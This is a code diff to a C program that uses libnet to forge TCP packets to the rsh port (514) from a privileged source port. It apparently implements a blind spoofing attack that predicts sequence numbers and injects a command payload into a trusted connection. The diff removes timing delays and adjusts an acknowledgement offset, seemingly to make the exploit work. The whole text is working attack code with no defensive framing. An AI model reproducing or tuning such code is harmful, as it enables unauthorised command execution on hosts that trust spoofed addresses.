@@ -106,7 +106,6 @@ u_int seq = libnet_get_prand(LIBNET_PRu32);
 build_tcp = libnet_build_tcp(998,514,seq,libnet_get_prand(LIBNET_PRu32),TH_SYN,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H,NULL,0,libentinit,build_tcp);
 build_ip = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,0,libnet_get_prand(LIBNET_PRu16),0,libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,source,destination,NULL,0,libentinit,build_ip);
 libnet_write(libentinit);
-usleep(25000);
 
 build_tcp = libnet_build_tcp(998,514,seq+1,prev_seq+difference+diff_diff+1,TH_ACK,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H,NULL,0,libentinit,build_tcp);
 build_ip = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,0,libnet_get_prand(LIBNET_PRu16),0,libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,source,destination,NULL,0,libentinit,build_ip);
@@ -123,9 +122,8 @@ usleep(25000);
 printf("Payload written ACK %u",libnet_write(libentinit));
 
 
-build_tcp = libnet_build_tcp(998,514,seq+command_len+1,prev_seq+difference+diff_diff+1+2,TH_ACK,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H,NULL,0,libentinit,build_tcp);
+build_tcp = libnet_build_tcp(998,514,seq+command_len+1,prev_seq+difference+diff_diff+1+1,TH_ACK,libnet_get_prand(LIBNET_PRu16),0, 0,LIBNET_TCP_H,NULL,0,libentinit,build_tcp);
 build_ip = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,0,libnet_get_prand(LIBNET_PRu16),0,libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,source,destination,NULL,0,libentinit,build_ip);
-usleep(25000);
 libnet_write(libentinit);
 
 exit(1);
